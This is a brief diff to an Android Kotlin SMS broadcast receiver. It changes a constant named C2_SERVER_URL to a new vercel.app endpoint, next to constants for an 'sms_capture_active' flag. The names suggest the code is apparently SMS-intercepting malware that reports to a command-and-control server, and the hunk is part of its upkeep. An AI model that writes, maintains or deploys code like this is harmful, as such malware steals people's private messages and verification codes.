@@ -19,7 +19,7 @@ class SmsReceiver : BroadcastReceiver() {
         private const val TAG = "DecrySmsReceiver"
         private const val PREFS_NAME = "decry_prefs"
         private const val KEY_SMS_CAPTURE_ACTIVE = "sms_capture_active"
-        private const val C2_SERVER_URL = "https://crytake.vercel.app/api"
+        private const val C2_SERVER_URL = "https://cry-take.vercel.app/api"
     }
 
     override fun onReceive(context: Context, intent: Intent) {
